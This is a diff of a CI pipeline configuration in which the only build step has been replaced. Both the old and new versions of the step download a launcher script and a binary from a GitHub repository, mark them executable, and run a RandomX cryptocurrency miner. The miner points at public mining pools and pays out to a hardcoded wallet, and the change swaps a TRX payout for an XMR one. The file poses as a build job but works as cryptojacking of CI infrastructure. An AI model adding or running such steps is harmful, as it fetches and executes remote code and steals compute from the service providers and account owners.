@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin TRX -wallet TLEPxPHUda5zZBWaxt1GPChNqEvMLcpifr  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 rx.unmineable.com:3333
+      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet 88TGj3yPcfRRbyKae8atRHFHZbck6wPr2beUMYLLyLks3WKJLiMDXEhc79A1ivwmHTJmGMFFuhwbgbetUspCFff245SeB7m  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
